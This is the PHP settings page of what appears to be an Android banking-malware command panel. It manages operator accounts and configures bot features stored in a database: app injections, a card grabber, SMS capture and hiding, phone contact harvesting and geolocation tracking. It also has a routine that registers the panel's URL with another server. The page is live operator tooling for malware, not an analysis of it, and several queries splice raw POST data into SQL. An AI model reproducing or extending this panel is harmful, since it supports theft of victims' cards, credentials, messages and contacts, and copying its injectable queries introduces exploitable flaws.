<?php
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /bots_login/index.php");
}else{

	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /bots_login/index.php");
	}

	if ($_SESSION['panel_right']!="admin"){
		header("Location: /index.php");
	}
}
?>

<div class="content">

<center>
<input type='submit' value='Users' onClick="location.href='index.php?cont=settings&page=users'" style='width:140px; margin-left:30px;margin-top:10px;' class='btn btn-outline-secondary'/>
<input type='submit' value='Bots settings'onClick="location.href='index.php?cont=settings&page=bots-settings'" style='width:140px; margin-left:30px;margin-top:10px;' class='btn btn-outline-secondary'/>
</center>




<script>
function reqProc()
{
	if (document.getElementById("requestProc").checked) {
		document.getElementById("textIDrequestProc").disabled = false;
	}else {
		document.getElementById("textIDrequestProc").value='';
		document.getElementById("textIDrequestProc").disabled = true;
	}
}

function reqGEO()
{
	if (document.getElementById("request_geo").checked) {
		document.getElementById("textIDRequest_geo").disabled = false;
	}else {
		document.getElementById("textIDRequest_geo").value='';
		document.getElementById("textIDRequest_geo").disabled = true;
	}
}

function addinjauto()
{
	if (document.getElementById("checkaddinjauto").checked) {
		document.getElementById("textIDaddinjauto").disabled = false;
	}else {
		document.getElementById("textIDaddinjauto").value='';
		document.getElementById("textIDaddinjauto").disabled = true;
	}
}

function addInjNoAuto()
{
	if (document.getElementById("IDaddInjNoAuto").checked) {
		document.getElementById("TextIDaddInjNoAuto").disabled = false;
	}else {
		document.getElementById("TextIDaddInjNoAuto").value='';
		document.getElementById("TextIDaddInjNoAuto").disabled = true;
	}
}
function GetPhoneContacts()
{
	if (document.getElementById("checkGetPhoneContacts").checked) {
		document.getElementById("TextIDcheckGetPhoneContacts").disabled = false;
	}else {
		document.getElementById("TextIDcheckGetPhoneContacts").value='';
		document.getElementById("TextIDcheckGetPhoneContacts").disabled = true;
	}
}

function Getgeolocation()
{
	if (document.getElementById("checkGetgeolocation").checked) {
		document.getElementById("TextIDcheckGetgeolocation").disabled = false;
	}else {
		document.getElementById("TextIDcheckGetgeolocation").value='';
		document.getElementById("TextIDcheckGetgeolocation").disabled = true;
	}
}
</script>

<?php

if ($_SESSION['panel_right']=="admin"){
if(isset($_POST["ADDUSER"]))//вызываем модальную форму!
{
	echo "<script>";
		echo "$(document).ready(function(){";
			echo "$('#adduser_modal').css({'display':'block'});";
		echo "});";
	echo "</script>";
}

if (preg_match("/edit/",print_r($_POST,true))){
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$str = print_r($_POST,true);
	$str = str_replace("[","@@@",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("@@@", $str);
	 $editid;
	$editid = str_replace("edit","", $massiv[1]);



	echo "<script>";
		echo "$(document).ready(function(){";
			echo "$('#edituser_modal').css({'display':'block'});";
		echo "});";
	echo "</script>";

}

if (preg_match("/delete/",print_r($_POST,true))){
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$str = print_r($_POST,true);
	$str = str_replace("[","@@@",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("@@@", $str);
	$str = str_replace("delete","", $massiv[1]);


	$sql = "DELETE FROM t_users WHERE id='$str'";
	$connection->query($sql);
}
if (preg_match("/disable/",print_r($_POST,true))){
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$str = print_r($_POST,true);
	$str = str_replace("[","@@@",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("@@@", $str);
	$str = str_replace("disable","", $massiv[1]);

	$sql = "UPDATE t_users SET status = 'Disabled' WHERE id = '$str';";
	$connection->query($sql);

}

if (preg_match("/enable/",print_r($_POST,true))){
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$str = print_r($_POST,true);
	$str = str_replace("[","@@@",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("@@@", $str);
	$str = str_replace("enable","",$massiv[1]);

	$sql = "UPDATE t_users SET status = 'Action' WHERE id = '$str';";
	$connection->query($sql);

}
if (preg_match("/connect/",print_r($_POST,true))){
	$str = print_r($_POST,true);
	$str = str_replace("[","@@@",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("@@@", $str);
	$url = str_replace("connect","",isset($massiv[1]) ? $massiv[1] : "");
	$Param = getURL_SERVER();
	$url=str_replace("_",".",$url);
	$md5=md5($url);
	$getData = SendHTTP("$url/setURL.php","$md5|$Param|");
}

$page = $_GET['page'];

	if($page == "bots-settings"){
		getBotsSETTINGS();
	}
	elseif($page == "users"){
		getUSERS();
	}
	else{
		getBotsSETTINGS();
	}

	}
?>


<?php
function getUSERS()
{

$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
$connection->exec('SET NAMES utf8');
$sql = "SELECT * FROM t_users";


echo "<form name='getUSERS' method='post'>
<center>
	<div id='DIV_USERS' style='width:75%; min-height: 300px; margin-top:20px;overflow: auto;border: 1px solid black; border-color: #43717a;	background: #1D1F24; border-radius: 4px;' >
		USERS";
echo "</br>";

echo "<input type='submit' value='Add User' name='ADDUSER' style='width:100px; margin-left:-83%;' class='btn btn-outline-success  '/>";

echo "<table class='table table-hover table_dark' id='bootstrap-table'>
    <thead class='header_table_bots'>

		<th>Login</th>
		<th>Permission</th>
		<th>Tag bots</th>
		<th>Status</th>
		<th>Actions</th>
	</thead>";

	foreach($connection->query($sql) as $row)
		{
			$id = $row['id'];
			$login = $row['login'];
			$right = $row['right_'];
			$status = $row['status'];
			$tag = $row['tag'];

		if(($tag=="")||($tag==" "))
		{
			$tag = "";
		}

		if($status != "Disabled")
		{
			$btn_act = "<input type='submit' value='DISABLED' name='disable$id' style='width:105px;' class='btn btn-outline-warning '/>";
		}
		else
		{
			$btn_act = "<input type='submit' value='ENABLE' name='enable$id' style='width:90px;' class='btn btn-outline-primary '/>";
		}

		echo "<tr class='table_bots' style='color: #A4A4A4;'>
		<td>$login </td>
		<td>$right</td>
		<td>$tag</td>
		<td>$status</td>
		<td>
		$btn_act
		<input type='submit' value='EDIT' name='edit$id' class='btn btn-outline-primary'/>
		<input type='submit' value='DELETE' name='delete$id'  class='btn btn-outline-danger'/>
		</td>
		</tr>";
		}
	echo "</table>";
	echo "</div>
	</center>
	</form>";
}

function getBotsSETTINGS()
{

	$connection3 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection3->exec('SET NAMES utf8');
	$sql3 = "SELECT * FROM settingsall";

	$checkInjectionsApps =  "";
	$secondInjectionsApps = "";
	$checkRequestGeolocation =  "";
	$secondRequestGeolocation = "";
	$checkGrab_auto =  "";
	$Grab_auto =  "";
	$secondGrab_auto =  "";
	$checkInjGrab =  "";
	$InjGrab = "";
	$secondInjGrab =  "";
	$checkPhoneContacts =  "";
	$secondPhoneContacts =  "";
	$checkStartGeolocation =  "";
	$secondStartGeolocation = "";
	$findfiles = "";
	foreach($connection3->query($sql3) as $row)
	{
		if($row['id']=="1")
		{
			$adminkaurl = $row['urls'];

			$injurl = $row['urlInj'];

			$intInterval = $row['intInterval'];
			if($intInterval=="") $intInterval = "14000";

			$checksms = $row['checksms'];

			$checkhidesms = $row['checkhidesms'];

			$checkgeolocation = $row['checkgeolocation'];

			$checkInjectionsApps = $row['checkInjectionsApps'];
			$secondInjectionsApps = $row['secondInjectionsApps'];

			$checkRequestGeolocation = $row['checkRequestGeolocation'];
			$secondRequestGeolocation = $row['secondRequestGeolocation'];

			$checkGrab_auto = $row['checkGrab_auto'];
			$secondGrab_auto = $row['secondGrab_auto'];

			$checkInjGrab = $row['checkInjGrab'];
			$secondInjGrab = $row['secondInjGrab'];

			$checkPhoneContacts = $row['checkPhoneContacts'];
			$secondPhoneContacts = $row['secondPhoneContacts'];

			$checkStartGeolocation = $row['checkStartGeolocation'];
			$secondStartGeolocation = $row['secondStartGeolocation'];

			$findfiles = $row['findfiles'];
			break;
		}
	}


	echo "<form name='getBotsSETTINGS' method='post' action='application/set/editSettingsPanel.php'>
		<div id='Bots_settings' style='width:34%; min-height: 300px; margin-top:20px; margin-left:36%;	border: 1px solid black; border-color: #43717a;	background: #1D1F24; border-radius: 4px;' >
			<center>Bots SETTINGS</center>
			</br></br>

			<a style='margin-left:5%; color:#fff'>URLs panel(url1,url2,..)</a>
			<input type='text' name='adminkaurl' value='$adminkaurl' id='adminkaurl' style='margin-left:4%; color: #00d700; background: #1D1F24; width: 92%; font-size: 13; height: 28px; border-radius: 5px;'></input>

			<input hidden type='text' name='injurl' value='$injurl' id='injurl' style='margin-left:5%; color: #00d700; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>
            <input hidden type='text' name='intInterval' value='$intInterval' id='intInterval' style='margin-left:5%; color: #00d700; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>

			<input hidden type='text' name='findfiles' value='$findfiles' id='intInterval' style='margin-left:5%; color: #00d700; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>
			";
			//-----------------------Авто инжект-------------------------
			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');
			$sql = "SELECT * FROM injection";
			$sql2 = "SELECT * FROM settingsall";

			echo "
			<input hidden type='text' name='secondInjGrab' value='$secondInjGrab' id='TextIDaddInjNoAuto' style='margin-left:5%; color: #00d700; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>";



			//-----------------------Выбранные инжекты--+--Граббер карт-------------------------
			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');
			$sql = "SELECT * FROM injection";
			$sql2 = "SELECT * FROM settingsall";

			foreach($connection->query($sql2) as $row)
			{
				$id=$row['id'];
				if($id=="1")
				{
					$InjGrab = $row['checkInjGrab'];
					$InjGrab = $row['InjGrab'];
					$secondInjGrab = $row['secondInjGrab'];
					break;
				}

			}
			$inject_s = explode("|", $InjGrab);

			echo "<div hidden style='width:75%; margin-top:5px; margin-left:5%; height:150px; background: #1D1F24;; border: 1px solid #C1C1C1; overflow: auto;'>";
			$idcheck=0;
			foreach($connection->query($sql) as $row)
			{
				$ID_inj = $row['id'];
				$name_inj = $row['name'];

					$bool_inj=false;
					foreach($inject_s as $ids)
					{
						$bool_inj=false;
						if($ids == $ID_inj)
						{
							echo "<input type=checkbox name=check2_set[] value=$ID_inj value='1' id='checkTextIDaddInjNoAuto$idcheck' style='margin-top: -10px;' checked='checked'><a style='color:#00d700'>$name_inj</a></input></br>";
							$idcheck++;
							break;
						}
						else
						{
							$bool_inj = true;
						}
					}
					if($bool_inj == true)
					{
						echo "<input type=checkbox name=check2_set[] value=$ID_inj id='checkTextIDaddInjNoAuto$idcheck' value='1' style='margin-top: -10px;'><a style='color:#00d700'> $name_inj</a></input></br>";
						$idcheck++;
					}
			}
			echo "</div>";

			echo "

			<center>
			<input type='submit' value='SAVE SETTINGS' id='SAVESETTINGS' name='SAVESETTINGS'   class='btn btn-outline-success' style='Width:40%; Height: 30px; font-size: 14; margin-top:20px;'/>
			</center>
			</br>
		</div>";
}


//*****
function CheckURL($url){
	if($url=check_url($url))
	{
	  if ($o=open_url($url))
	  {
		return true;
	  }
	  else
	  {
		return false;
	  }
	}
	else return false;
}
function check_url($url)
{
  if(preg_match("@^http://@i",$url)) $url = preg_replace("@(http://)+@i",'http://',$url);
  else if (preg_match("@^https://@i",$url)) $url = preg_replace("@(https://)+@i",'https://',$url);
  else $url = 'http://'.$url;


  if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
    return false;
	}
	else return $url;
}
 // Существование ссылки (URL)
function open_url($url)
{
 $url_c=parse_url($url);

  if (!empty($url_c['host']) and checkdnsrr($url_c['host']))
  {
    // Ответ сервера
    if ($otvet=@get_headers($url)){
      return substr($otvet[0], 9, 3);
    }
  }
  return false;
}

function SendHTTP($URL,$request){
	//if(CheckURL("$URL")){
		if(($request!=null)&&(strlen($request)!=0)){
			$params = array('p' => $request);
			$result = file_get_contents("$URL", false, stream_context_create(array(
				'http' => array(
					'method'  => 'POST',
					'header'  => 'Content-type: application/x-www-form-urlencoded',
					'content' => http_build_query($params)
				)
			)));
		}
		return "$result";
	/*}else{
		return "noconnect|";*/
	//}
}
//*****
function getURL_SERVER(){
	$protocol=empty($_SERVER['HTTPS'])?'http://':'https://';
	$SERVER_NAME = $_SERVER['SERVER_NAME'];
	return "$protocol$SERVER_NAME";
}
//*****
?>



<?php//--ADD USERS"--------?>
<div id = "adduser_modal" style="padding-top:70px;">
	<div id = "modal_s" style="Width:280px; Height: 340px; background: #1D1F24;	margin: 100px auto 0 auto;	padding: 10px;	border-radius: 5px;">
	<a id="exit" href="index.php?cont=settings&page=users"  style="margin-left:97%; cursor: pointer; color: Red;" onclick="document.getElementById('log_modal').style.display = 'none'";>X</a>
		<form name="modal_set"  method="POST" action="application/set/addUsers.php">
		<div class="styled-select">

			<a style='color:#fff'>LOGIN</a><input type="text" name="login" id="styled-select" style="color: #00d700; background: #1D1F24; width: 100%; font-size: 13; height: 28px;"></input>
			</br></br>

			<a style='color:#fff'>RIGHT</a>
			<select  name="RIGHT" style='color: #00d700; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'>
				<option value='user'>User
				<option value='traffic'>Traffic
				<option value='admin'>Admin
			</select>
			</br></br>
			<a style='color:#fff'>PRIVATE TAG (tag1,tag2,..)</a><input type='text' name='tag' id='styled-select' style='color: #00d700; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'></input>

			<center>
			<input type='submit' value='ADD USER' id="ADDUSER" name='ADDUSER'   class='btn btn-success' style='Width:100%; Height: 30px; font-size: 14; margin-top:20px;'/>
			</center>
		</div>
		</form>
	</div>
</div>

<?php//--EDIT USERS"--------?>
<div id = "edituser_modal" style="padding-top:70px;">
	<div id = "modal_s" style="Width:280px; Height: 340px; background: #1D1F24;	margin: 100px auto 0 auto;	padding: 10px;	border-radius: 5px;">
	<a id="exit" href="index.php?cont=settings&page=users"  style="margin-left:97%; cursor: pointer; color: Red;" onclick="document.getElementById('log_modal').style.display = 'none'";>X</a>
		<form name="modal_set"  method="POST" action="application/set/editUsers.php">
		<div class="styled-select">

			<?php


			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');
			$sql = "SELECT * FROM t_users";

			$login = "";
			$password = "";
			$right = "";
			$tag = "";

			$editid = isset($editid) ? $editid : '';  // 0?

			foreach($connection->query($sql) as $row)
			{
				if($editid==$row['id'])
				{
				$login = $row['login'];
				$password = $row['password'];
				$tag=$row['tag'];
				break;
				}
			}

			echo "
			<a style='color:#fff'>LOGIN</a><input type='text' value='$login'  name='login' id='styled-select' style='color: #00d700; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'></input>
			</br></br>

			<a style='color:#fff'>RIGHT</a>
			<select  name='RIGHT' style='color: #00d700; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'>
				<option value='user'>User
				<option value='traffic'>Traffic
				<option value='admin'>Admin
			</select>
			</br></br>
			<a style='color:#fff'>PRIVATE TAG (tag1,tag2,..)</a><input type='text' value='$tag' name='tag' id='styled-select' style='color: #00d700; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'></input>
			";?>


			<center>
			<input type='submit' value='EDIT USER' id="EDITUSER" name='EDITUSER'   class='btn btn-outline-success' style='Width:100%; Height: 30px; font-size: 14; margin-top:20px;'/>
			</center>
			<?php echo "<input type='text' value=$editid name='getID' style='visibility:hidden'/>";?>
		</div>

		</form>
	</div>
</div>

<script>
if (document.getElementById("requestProc").checked) {
	document.getElementById("textIDrequestProc").disabled = false;
}else {
	document.getElementById("textIDrequestProc").value='';
	document.getElementById("textIDrequestProc").disabled = true;
}
if (document.getElementById("request_geo").checked) {
	document.getElementById("textIDRequest_geo").disabled = false;
}else {
	document.getElementById("textIDRequest_geo").value='';
	document.getElementById("textIDRequest_geo").disabled = true;
}

if (document.getElementById("checkGetPhoneContacts").checked) {
	document.getElementById("TextIDcheckGetPhoneContacts").disabled = false;
}else {
	document.getElementById("TextIDcheckGetPhoneContacts").value='';
	document.getElementById("TextIDcheckGetPhoneContacts").disabled = true;
}

if (document.getElementById("checkGetgeolocation").checked) {
	document.getElementById("TextIDcheckGetgeolocation").disabled = false;
}else {
	document.getElementById("TextIDcheckGetgeolocation").value='';
	document.getElementById("TextIDcheckGetgeolocation").disabled = true;
}



if (document.getElementById("IDaddInjNoAuto").checked) {
	document.getElementById("TextIDaddInjNoAuto").disabled = false;

}else {
	document.getElementById("TextIDaddInjNoAuto").value='';
	document.getElementById("TextIDaddInjNoAuto").disabled = true;


}

if (document.getElementById("checkaddinjauto").checked) {
	document.getElementById("textIDaddinjauto").disabled = false;

}else {
	document.getElementById("textIDaddinjauto").value='';
	document.getElementById("textIDaddinjauto").disabled = true;

}
</script>
